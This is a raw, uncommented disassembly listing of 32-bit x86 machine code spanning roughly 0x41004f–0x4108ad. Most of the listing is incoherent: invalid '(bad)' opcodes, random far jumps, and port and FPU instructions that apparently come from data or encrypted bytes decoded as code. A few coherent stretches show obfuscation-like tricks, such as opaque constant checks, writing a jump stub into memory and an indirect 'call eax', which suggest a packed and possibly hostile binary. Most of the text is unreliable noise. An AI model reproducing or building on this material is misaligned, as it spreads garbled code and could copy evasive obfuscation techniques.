  41004f:	std    
  410050:	mov    ds:0x4ade29e4,eax
  410055:	jge    0x410025
  410057:	repnz shl edi,cl
  41005a:	dec    eax
  41005b:	sub    al,BYTE PTR [eax-0x6c02e9e7]
  410061:	mov    ecx,0x9613e903
  410066:	adc    al,0x6c
  410068:	pop    esp
  410069:	sbb    eax,0x8b6750ca
  41006e:	mov    esi,0x7c4a3f02
  410073:	mov    ah,0x28
  410075:	aas    
  410076:	mov    ebp,0x67bbc3ad
  41007b:	xor    eax,0x1c423318
  410080:	loop   0x410023
  410082:	int    0x3
  410084:	jne    0x4100f3
  410086:	cs jne 0x4100b2
  410089:	scas   eax,DWORD PTR es:[edi]
  41008a:	cmc    
  41008b:	inc    esi
  41008c:	rcl    BYTE PTR [ebp+0xc47629],0xfe
  410093:	mov    WORD PTR [bx+si+0x164],ss
  410098:	test   DWORD PTR [ebx],0x8405519a
  41009e:	jb     0x410066
  4100a0:	adc    eax,0xc8803b3e
  4100a5:	add    DWORD PTR [ebx+0xf],ecx
  4100a8:	push   edi
  4100a9:	sub    al,0x59
  4100ab:	push   edi
  4100ac:	fldcw  WORD PTR [edi+esi*2-0x24]
  4100b0:	adc    al,BYTE PTR [ebp-0x7e]
  4100b3:	fidivr WORD PTR [ecx+0x17]
  4100b6:	sar    DWORD PTR [esi-0x38],cl
  4100b9:	pop    ecx
  4100ba:	pop    ecx
  4100bb:	xchg   BYTE PTR ds:0x118388c3,ah
  4100c1:	xlat   BYTE PTR ds:[ebx]
  4100c2:	cmp    eax,0x19fc4ea7
  4100c7:	frstor [eax-0x1701b900]
  4100cd:	das    
  4100ce:	mov    esp,0xf4348b8
  4100d3:	xchg   esp,eax
  4100d4:	stos   BYTE PTR es:[edi],al
  4100d5:	jbe    0x41014b
  4100d7:	fstp   QWORD PTR [edx-0x248ddad7]
  4100dd:	adc    BYTE PTR [ebx],dl
  4100df:	lods   al,BYTE PTR ds:[esi]
  4100e0:	pop    es
  4100e1:	dec    esi
  4100e2:	mov    eax,0xae8af0d1
  4100e7:	adc    cl,ah
  4100e9:	sbb    DWORD PTR [esi-0x40ea0aae],ebx
  4100ef:	fmul   st(3),st
  4100f1:	and    cl,BYTE PTR [ebp+0x25974da8]
  4100f7:	jp     0x410172
  4100f9:	nop
  4100fa:	mov    eax,ds:0xdfc90208
  4100ff:	cmp    eax,0x3160e555
  410104:	and    BYTE PTR [esi+0x571c8efc],al
  41010a:	inc    ebx
  41010b:	inc    DWORD PTR ss:[edx]
  41010e:	ins    BYTE PTR es:[edi],dx
  41010f:	gs jmp 0x60ac:0x85e2837
  410117:	loopne 0x41013b
  410119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011a:	and    eax,0xe478572e
  41011f:	push   esp
  410120:	push   esp
  410121:	jnp    0x4100f5
  410123:	sub    eax,0x6c9c3dd5
  410128:	loope  0x4100c0
  41012a:	fmul   QWORD PTR [edx+0x73]
  41012d:	aad    0x81
  41012f:	adc    BYTE PTR [ebx+0x4f],dh
  410132:	aaa    
  410133:	rcl    BYTE PTR ds:0x1894050,cl
  410139:	jno    0x4101a5
  41013b:	repz sbb al,0x14
  41013e:	loop   0x410187
  410140:	pushf  
  410141:	or     edx,DWORD PTR cs:[eax]
  410144:	les    edx,FWORD PTR [ecx+ebp*1+0x7b10efd3]
  41014b:	jbe    0x41018a
  41014d:	or     eax,0x9c2c6aa6
  410152:	cld    
  410153:	xchg   esp,eax
  410154:	stc    
  410155:	popa   
  410156:	adc    bl,dh
  410158:	and    DWORD PTR [ebp-0x172e5fe],esi
  41015e:	jmp    0x89b:0x2031e2e2
  410165:	mov    dh,0x55
  410167:	in     al,0xb7
  410169:	mov    al,ds:0x849ffe09
  41016e:	mov    edi,0xcb9dfe8c
  410173:	pop    ss
  410174:	jmp    0x817ed96f
  410179:	fdivp  st(5),st
  41017b:	jnp    0x4101bc
  41017d:	push   esp
  41017e:	jge    0x41014e
  410180:	inc    ebx
  410181:	out    0x28,eax
  410183:	stos   BYTE PTR es:[edi],al
  410184:	sqrtps xmm7,XMMWORD PTR [ebx-0x67]
  410188:	lock in al,dx
  41018a:	out    0x5,eax
  41018c:	push   ss
  41018d:	jecxz  0x410113
  41018f:	dec    ebp
  410191:	fwait
  410192:	ins    BYTE PTR es:[edi],dx
  410193:	mov    cl,0x4b
  410195:	xlat   BYTE PTR ds:[ebx]
  410196:	mov    ds:0xcf4dfc14,eax
  41019b:	mov    dh,0x91
  41019d:	cmp    BYTE PTR [ecx-0x512c1e2f],ch
  4101a3:	(bad)  
  4101a4:	int    0xd6
  4101a6:	rol    BYTE PTR [ecx+0x47f59a2f],cl
  4101ac:	inc    eax
  4101ad:	push   ss
  4101ae:	aas    
  4101af:	jbe    0x410140
  4101b1:	mov    ah,0x25
  4101b3:	(bad)  [eax+0x651c2123]
  4101b9:	xchg   esi,eax
  4101ba:	mov    eax,0xb602336a
  4101bf:	inc    si
  4101c1:	(bad)  
  4101c2:	(bad)  
  4101c3:	call   FWORD PTR [esi-0x51]
  4101c6:	mov    cl,0x33
  4101c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101c9:	test   eax,0x17b6cfb4
  4101ce:	xor    dh,BYTE PTR [ecx-0x14f1a1fe]
  4101d4:	(bad)  
  4101d5:	rcr    DWORD PTR [ebx+0x392d7db4],1
  4101db:	pop    ds
  4101dc:	pop    edx
  4101dd:	xchg   ebp,eax
  4101de:	je     0x410255
  4101e0:	mov    al,ds:0x7dc1b16
  4101e5:	sti    
  4101e6:	dec    edx
  4101e7:	xor    dh,dh
  4101e9:	test   eax,0xc566bca4
  4101ee:	sbb    DWORD PTR gs:[ebx-0x4f],edi
  4101f2:	leave  
  4101f3:	(bad)  
  4101f4:	aas    
  4101f5:	mov    dh,0x33
  4101f7:	mov    ch,0x63
  4101f9:	jmp    0x8822e407
  4101fe:	inc    ebp
  4101ff:	retf   0x677e
  410202:	mov    ah,0x4c
  410204:	dec    esi
  410205:	cmp    ebx,DWORD PTR [eax]
  410207:	mov    WORD PTR [ebp+0x71],?
  41020a:	int    0x70
  41020c:	(bad)  
  41020d:	std    
  41020e:	out    0x70,eax
  410210:	add    al,0x2e
  410212:	shl    DWORD PTR [edx-0x1d626177],0x7b
  410219:	jle    0x410280
  41021b:	or     ah,BYTE PTR [edx+0x39]
  41021e:	mov    cl,0xc
  410220:	loop   0x41021d
  410222:	push   es
  410223:	hlt    
  410224:	jne    0x41065f
  41022a:	mov    ecx,DWORD PTR [ebp-0x78]
  41022d:	xor    edx,edx
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422598
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422598
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x4226a0
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422698],eax
  4102bc:	inc    DWORD PTR ds:0x4226a0
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	rol    DWORD PTR cs:[edi+0x1892c37c],1
  410313:	sbb    BYTE PTR [esi+0x27181814],bh
  410319:	(bad)  
  41031a:	aad    0xde
  41031c:	xchg   DWORD PTR [ecx+0x76fbc6ef],esp
  410322:	scas   eax,DWORD PTR es:[edi]
  410323:	lods   eax,DWORD PTR ds:[esi]
  410324:	call   0xa66ef993
  410329:	mov    bl,0xe6
  41032b:	jbe    0x4102c9
  41032d:	xlat   BYTE PTR ds:[ebx]
  41032e:	push   ebp
  41032f:	psrlw  mm7,QWORD PTR [eax-0x1c7d2bd6]
  410336:	sbb    eax,0xf364ed12
  41033b:	mov    bl,0xdd
  41033d:	in     eax,0xb4
  41033f:	mov    ecx,0xc5748843
  410344:	and    al,0x75
  410346:	pop    esp
  410347:	popf   
  410348:	ins    BYTE PTR es:[edi],dx
  410349:	outs   dx,BYTE PTR ds:[esi]
  41034a:	add    al,0x70
  41034c:	aas    
  41034d:	mov    edx,DWORD PTR ds:0x133733c3
  410353:	pop    eax
  410354:	je     0x4103b9
  410356:	nop
  410357:	pop    ebp
  410358:	inc    eax
  410359:	mov    ebp,0x1f58ba76
  41035e:	add    ah,dh
  410360:	mov    esi,0xd6892bbe
  410365:	ret    0x74cf
  410368:	jbe    0x410385
  41036a:	std    
  41036b:	inc    eax
  41036c:	sub    ebx,DWORD PTR [esi]
  41036e:	jmp    0x3e2c:0x13c49c40
  410375:	jb     0x410321
  410377:	jl     0x4103a2
  410379:	mov    ebp,ebx
  41037b:	mov    ds:0xa93f4753,al
  410380:	sub    al,0x33
  410382:	lock jno 0x4103a1
  410385:	pop    esi
  410386:	rcr    DWORD PTR [edi],0xb
  410389:	ror    DWORD PTR [esp+eax*4+0x6d],1
  41038d:	jg     0x4103a9
  41038f:	loope  0x410332
  410391:	mov    bh,0x9c
  410393:	retf   0x6de6
  410396:	inc    ebp
  410397:	lods   eax,DWORD PTR ds:[esi]
  410398:	mov    bh,0x90
  41039a:	outs   dx,BYTE PTR ds:[esi]
  41039b:	xchg   DWORD PTR [ecx],edi
  41039d:	ret    0xed93
  4103a0:	mov    bh,0x41
  4103a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103a3:	cs and al,0x1b
  4103a6:	out    dx,eax
  4103a7:	mov    ds:0xb188cac0,eax
  4103ac:	rol    bh,cl
  4103ae:	repnz ins BYTE PTR es:[edi],dx
  4103b0:	push   esi
  4103b1:	shr    BYTE PTR [eax-0x60b04e7a],cl
  4103b7:	lods   al,BYTE PTR ds:[esi]
  4103b8:	repz (bad) 
  4103ba:	jg     0x410371
  4103bc:	out    dx,al
  4103bd:	dec    ebp
  4103be:	sbb    esp,DWORD PTR [ecx+0x1f8fe39d]
  4103c4:	sbb    BYTE PTR [eax-0x4f2a39db],al
  4103ca:	lds    edx,FWORD PTR [eax-0x35]
  4103cd:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4103cf:	es mov esi,0xcc01076d
  4103d5:	hlt    
  4103d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d7:	out    dx,al
  4103d8:	add    eax,0xa1a83d5c
  4103dd:	dec    edx
  4103de:	ins    DWORD PTR es:[edi],dx
  4103df:	xor    DWORD PTR [edx],ebx
  4103e1:	out    0xaa,eax
  4103e3:	cdq    
  4103e4:	and    al,BYTE PTR [ebx+0x45]
  4103e7:	adc    cl,bh
  4103e9:	out    0xee,eax
  4103eb:	adc    DWORD PTR [ecx+ecx*1-0x35],0xaccdccd
  4103f3:	repz add ebp,DWORD PTR [edi-0x70439756]
  4103fa:	sbb    DWORD PTR [edx+0x42fba7ec],ebx
  410400:	call   0x6162f54d
  410405:	std    
  410406:	data16 stc 
  410408:	pop    esi
  410409:	clc    
  41040a:	push   esi
  41040b:	dec    edx
  41040c:	pop    eax
  41040d:	out    dx,al
  41040e:	cmp    al,0xe4
  410410:	dec    ebx
  410411:	jg     0x4103fb
  410413:	retf   0x192b
  410416:	or     DWORD PTR [edi-0x57],edx
  410419:	mov    ah,0x94
  41041b:	adc    eax,0x5e873622
  410420:	cwde   
  410421:	cli    
  410422:	test   BYTE PTR [eax+0x26],ch
  410425:	push   esi
  410426:	lahf   
  410427:	sahf   
  410428:	inc    esp
  410429:	leave  
  41042a:	dec    DWORD PTR [ebx-0x6a61f094]
  410430:	in     al,dx
  410431:	mov    ah,0x3
  410433:	jmp    0x410402
  410435:	bnd jge 0x410461
  410438:	hlt    
  410439:	mov    ds:0x901790b7,eax
  41043e:	sbb    al,0xc2
  410440:	(bad)  [ebx]
  410442:	fisttp QWORD PTR [ebp+0x6b90bf51]
  410448:	or     DWORD PTR [edx+0x1b],0x3e
  41044c:	push   ecx
  41044d:	push   ss
  41044e:	add    al,0x54
  410450:	arpl   WORD PTR [ecx],bp
  410452:	mov    dl,dh
  410454:	mov    ch,0xd6
  410456:	xlat   BYTE PTR ds:[ebx]
  410457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410458:	push   esi
  410459:	or     al,0x6
  41045b:	adc    dl,BYTE PTR [ecx-0x5da20c44]
  410461:	sub    eax,DWORD PTR [ecx+0x72]
  410464:	test   DWORD PTR [ecx],esi
  410466:	pushf  
  410467:	push   ecx
  410468:	sahf   
  410469:	sbb    edi,esp
  41046b:	les    ecx,FWORD PTR [ecx]
  41046d:	(bad)  [edx]
  41046f:	xchg   BYTE PTR [ebx+0x43e0974d],al
  410475:	sub    DWORD PTR [ebp-0x61],0x7b
  410479:	jns    0x410495
  41047b:	jle    0x4104ca
  41047d:	xor    al,0xf6
  41047f:	inc    edi
  410480:	pop    esi
  410481:	mov    ds:0x573f1f78,al
  410486:	inc    DWORD PTR [edi-0x3711bca6]
  41048c:	inc    edi
  41048d:	ins    DWORD PTR es:[edi],dx
  41048e:	jmp    0x9561071b
  410493:	es loop 0x4104dc
  410496:	mov    edi,eax
  410498:	add    ecx,DWORD PTR [ebp-0x69]
  41049b:	cmp    ebx,DWORD PTR [edi+0x5]
  41049e:	std    
  41049f:	adc    al,0xd6
  4104a1:	jecxz  0x41042d
  4104a3:	retf   
  4104a4:	jo     0x4104d0
  4104a6:	ret    
  4104a7:	fld    DWORD PTR [edi+0x23b3012e]
  4104ad:	stc    
  4104ae:	lahf   
  4104af:	out    dx,al
  4104b0:	cmc    
  4104b1:	dec    ebx
  4104b2:	jmp    0x5943:0x18420171
  4104b9:	stc    
  4104ba:	fdivr  DWORD PTR [esi+0x5]
  4104bd:	cmp    DWORD PTR [edi+0x62af5079],eax
  4104c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104c4:	push   edx
  4104c5:	pop    ecx
  4104c6:	repz pop esp
  4104c8:	inc    ecx
  4104c9:	adc    eax,ebp
  4104cb:	cmp    ah,BYTE PTR [esi]
  4104cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104ce:	mov    bh,0x8a
  4104d0:	sbb    DWORD PTR [edx],esi
  4104d2:	ins    BYTE PTR es:[edi],dx
  4104d3:	out    0x44,al
  4104d5:	push   ebp
  4104d6:	xor    al,0xd2
  4104d8:	ror    DWORD PTR [ecx-0x6f7338d3],1
  4104de:	and    edi,DWORD PTR [ebp+ebp*4-0x3b971a09]
  4104e5:	mov    al,ds:0xea8cbe86
  4104ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104eb:	inc    ecx
  4104ec:	imul   ecx,esi,0x9edd41ff
  4104f2:	inc    ebp
  4104f3:	dec    esi
  4104f4:	clc    
  4104f5:	fistp  QWORD PTR ds:[esi-0x44]
  4104f9:	push   edx
  4104fa:	dec    esp
  4104fb:	lock (bad) 
  4104fd:	in     eax,dx
  4104fe:	pop    ss
  4104ff:	in     eax,dx
  410500:	sahf   
  410501:	loop   0x410509
  410503:	dec    eax
  410504:	js     0x4104d4
  410506:	lods   al,BYTE PTR ds:[esi]
  410507:	adc    esp,DWORD PTR [ebx+0x3b695122]
  41050d:	cld    
  41050e:	cmc    
  41050f:	cld    
  410510:	xor    al,0xee
  410512:	jno    0x4104d1
  410514:	clc    
  410515:	inc    ecx
  410516:	xchg   ebx,eax
  410517:	dec    esi
  410518:	jle    0x4104b4
  41051a:	cmp    DWORD PTR [ebx-0x7],ecx
  41051d:	mov    esp,0xe9a21b69
  410522:	aaa    
  410523:	jnp    0x41057e
  410525:	add    al,0x57
  410527:	cwde   
  410528:	xor    BYTE PTR ds:0x6fa1b260,0x48
  41052f:	nop
  410530:	and    DWORD PTR [esi+0x36e71479],esi
  410536:	fnstcw WORD PTR [ebp+0x3d]
  410539:	fnstsw WORD PTR [edi-0x1c3f9d60]
  41053f:	inc    edi
  410540:	and    BYTE PTR [esi+eiz*1-0x6d],bl
  410544:	sti    
  410545:	inc    eax
  410546:	jns    0x4104d5
  410548:	popf   
  410549:	mov    cl,0xae
  41054b:	out    dx,al
  41054c:	inc    DWORD PTR [ecx+edx*1-0x2]
  410550:	lods   al,BYTE PTR ds:[esi]
  410551:	mov    cl,0xb8
  410553:	mov    esp,0xa5613d47
  410558:	sub    edi,DWORD PTR [bp+0x5b]
  41055c:	pop    DWORD PTR [edi]
  41055e:	retf   
  41055f:	and    al,0x34
  410561:	mov    dl,BYTE PTR [eax-0x44]
  410564:	(bad)  [esi-0x4dfc68c6]
  41056a:	jmp    0x41051a
  41056c:	je     0x410575
  41056e:	test   DWORD PTR [edi+0x5845e61c],ebx
  410574:	aad    0x2
  410576:	push   ecx
  410577:	outs   dx,BYTE PTR ds:[esi]
  410578:	shl    BYTE PTR [ebx+0x18],cl
  41057b:	or     dl,BYTE PTR [ebx+0x5ce9883]
  410581:	cli    
  410582:	adc    al,0x93
  410584:	mov    ebx,0x1db5cd07
  410589:	cmp    DWORD PTR [edx-0x5f],esp
  41058c:	mov    ecx,0x82929e24
  410591:	out    dx,al
  410592:	sar    DWORD PTR [esp+edi*8],0x17
  410596:	sub    BYTE PTR [eax+0x58730f9b],dh
  41059c:	mov    ch,bl
  41059e:	cmp    cl,BYTE PTR [esi+0x44]
  4105a1:	(bad)  
  4105a2:	aam    0x2d
  4105a4:	inc    ebp
  4105a5:	and    al,0xfc
  4105a7:	xchg   ebx,eax
  4105a8:	push   eax
  4105a9:	xor    al,0xd0
  4105ab:	mov    al,ds:0x1fbe2ba5
  4105b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105b1:	mov    ?,WORD PTR [ecx]
  4105b3:	and    al,al
  4105b5:	xlat   BYTE PTR ds:[ebx]
  4105b6:	rcl    DWORD PTR [ebx+0x44],1
  4105b9:	mov    al,0x2f
  4105bb:	scas   eax,DWORD PTR es:[edi]
  4105bc:	pushf  
  4105bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105be:	xchg   edx,eax
  4105bf:	push   ss
  4105c0:	ins    BYTE PTR es:[edi],dx
  4105c1:	imul   ebx,ecx,0xffffffef
  4105c4:	icebp  
  4105c5:	fist   WORD PTR [ebx+0x6]
  4105c8:	adc    BYTE PTR [ebp-0x7a760fbb],cl
  4105ce:	fs (bad) 
  4105d0:	(bad)  
  4105d1:	dec    DWORD PTR [ebx+0x4589ac45]
  4105d7:	lock mov eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422414
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422688
  410612:	push   DWORD PTR ds:0x42241c
  410618:	push   DWORD PTR ds:0x422668
  41061e:	push   DWORD PTR ds:0x4226dc
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422598
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	pop    es
  4106ed:	inc    ebp
  4106ee:	cld    
  4106ef:	mov    esi,0x18188e68
  4106f4:	call   0x9bb1:0x9181814
  4106fb:	clc    
  4106fc:	dec    ebp
  4106fd:	jne    0x4106c0
  4106ff:	adc    eax,0xf583f119
  410704:	inc    edx
  410705:	push   edx
  410706:	dec    edi
  410707:	xlat   BYTE PTR ds:[ebx]
  410708:	inc    esp
  410709:	cmp    esp,eax
  41070b:	dec    ebx
  41070c:	xor    al,ah
  41070e:	imul   DWORD PTR [edi-0x36e70065]
  410714:	mov    al,ds:0x326d47fd
  410719:	jnp    0x4106ce
  41071b:	xor    dl,dl
  41071d:	rol    edi,cl
  41071f:	push   0xfd8b295c
  410724:	test   eax,eax
  410726:	jno    0x4107a2
  410728:	rcl    BYTE PTR [ebx],0xd2
  41072b:	add    esp,DWORD PTR [edx+0x4e323f5c]
  410731:	jmp    0x82c3ea21
  410736:	mov    bh,bl
  410738:	clc    
  410739:	or     ch,BYTE PTR [edx+0x211fb0a9]
  41073f:	hlt    
  410740:	pusha  
  410741:	pop    ebx
  410742:	mov    bh,0x9c
  410745:	cmp    BYTE PTR [esi-0xf],ch
  410748:	stc    
  410749:	cs bswap eax
  41074c:	pop    ebx
  41074d:	inc    edi
  41074e:	dec    esi
  41074f:	iret   
  410750:	and    eax,0xf3d0ace0
  410755:	xchg   ecx,eax
  410756:	pop    ebx
  410757:	xchg   edi,eax
  410758:	(bad)  
  410759:	jmp    0x5331:0x49527d99
  410760:	or     bh,BYTE PTR [eax+0x28f9059d]
  410766:	dec    eax
  410767:	xchg   edi,eax
  410768:	imul   DWORD PTR [ebx-0x6ca475a3]
  41076e:	adc    esp,DWORD PTR [esi-0x360f4065]
  410774:	add    DWORD PTR [edi+0x23c8eb76],ebp
  41077a:	xchg   ebx,eax
  41077b:	pop    esp
  41077c:	xor    eax,0x60a69c77
  410781:	jbe    0x41075c
  410783:	jecxz  0x410733
  410785:	push   esi
  410786:	(bad)  
  410787:	xor    al,0x45
  410789:	fild   DWORD PTR ds:0x4f426b0
  41078f:	daa    
  410790:	cmp    esi,DWORD PTR [edx+0x4c]
  410793:	add    dl,dl
  410795:	mov    eax,ds:0xb735ef2d
  41079a:	jb     0x4107d0
  41079c:	and    al,0x80
  41079e:	jae    0x41073b
  4107a0:	stos   BYTE PTR es:[edi],al
  4107a1:	mov    ebp,0xf7a5616a
  4107a6:	aad    0x88
  4107a8:	(bad)  
  4107a9:	fimul  DWORD PTR [ebx+0x5f30077c]
  4107af:	retf   0xf3c0
  4107b2:	xchg   esi,eax
  4107b3:	push   esi
  4107b4:	add    ebp,DWORD PTR [edi]
  4107b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107b7:	add    al,BYTE PTR [esi+0x16]
  4107ba:	or     ah,cl
  4107bc:	nop
  4107bd:	push   eax
  4107be:	mov    eax,0x3820cfec
  4107c3:	mov    edx,0xd1ee2a86
  4107c8:	sbb    al,0xae
  4107ca:	dec    ebx
  4107cb:	scas   al,BYTE PTR es:[edi]
  4107cc:	jnp    0x4107af
  4107ce:	add    ah,dl
  4107d0:	mov    bl,0x4
  4107d2:	pop    ds
  4107d3:	push   ds
  4107d4:	iret   
  4107d5:	jg     0x410840
  4107d7:	xchg   ebp,eax
  4107d8:	sbb    DWORD PTR [edx-0x62],ebp
  4107db:	sub    edx,DWORD PTR [edx+0x51]
  4107de:	data16 jg 0x41081d
  4107e1:	dec    ecx
  4107e2:	mov    dl,BYTE PTR [edx]
  4107e4:	daa    
  4107e5:	mov    bl,0xae
  4107e7:	mov    esi,DWORD PTR [ebx+0x31360eb4]
  4107ed:	mov    DWORD PTR [edi+0x25],ebp
  4107f0:	mov    dh,BYTE PTR [edi+0x29722f32]
  4107f6:	mov    dl,0xc1
  4107f8:	and    bh,BYTE PTR [ebx+0x77]
  4107fb:	push   ebp
  4107fc:	push   ds
  4107fd:	lds    esi,FWORD PTR [edx+eax*2+0x7b3c0656]
  410804:	repz fstp DWORD PTR [ecx-0x41485915]
  41080b:	fld    st(5)
  41080d:	call   0xf1c4:0x97a248e5
  410814:	das    
  410815:	push   0xb3ce62a7
  41081a:	inc    edi
  41081b:	aad    0x8
  41081d:	cmc    
  41081e:	(bad)  
  41081f:	loopne 0x410829
  410821:	xchg   ecx,eax
  410823:	ret    
  410824:	stc    
  410825:	fadd   QWORD PTR [edi-0x6caf948f]
  41082b:	inc    edx
  41082c:	or     al,0x58
  41082e:	sub    eax,0x6d311240
  410833:	xchg   edi,eax
  410834:	add    DWORD PTR [eax+0x22],0x75d92cbc
  41083b:	push   ecx
  41083c:	jmp    0x41087f
  41083e:	and    DWORD PTR [esi],0x70d18dbf
  410844:	sbb    DWORD PTR ds:0xfd018d9c,ebx
  41084a:	ja     0x41086d
  41084c:	out    0x76,eax
  41084e:	adc    DWORD PTR [esi],ecx
  410850:	mov    DWORD PTR [esi+eiz*1],eax
  410853:	in     al,dx
  410854:	dec    esp
  410855:	ror    BYTE PTR [esi+ebp*8-0x1785d75f],0xfc
  41085d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41085e:	mov    bh,0xdd
  410860:	sbb    BYTE PTR [edi-0xc69507f],cl
  410866:	fsubr  st,st(1)
  410868:	inc    edx
  410869:	lock xlat BYTE PTR ds:[ebx]
  41086b:	and    BYTE PTR [esi],bl
  41086d:	adc    eax,0xbea86f96
  410872:	outs   dx,BYTE PTR ds:[esi]
  410873:	pop    ss
  410874:	dec    esi
  410875:	dec    esi
  410876:	lea    esi,[ecx]
  410878:	sub    eax,0x5ad1a3b8
  41087d:	and    ah,BYTE PTR [edi+esi*4]
  410880:	fnsave [edi-0x2fc4c843]
  410886:	jne    0x41084f
  410888:	fs hlt 
  41088a:	sub    edx,0x43
  41088d:	dec    ecx
  41088e:	(bad)  
  41088f:	dec    edi
  410890:	and    bl,0x52
  410893:	mov    bl,0xcb
  410895:	sub    eax,0x95fbc400
  41089a:	sub    al,0x31
  41089c:	cld    
  41089d:	mov    dl,0xbe
  41089f:	cli    
  4108a0:	lods   al,BYTE PTR ds:[esi]
  4108a1:	push   ds
  4108a2:	sub    dl,ch
  4108a4:	jecxz  0x4108d2
  4108a6:	mov    edi,0x46a88e50
  4108ab:	lds    edi,FWORD PTR [eax]
  4108ad:	das    
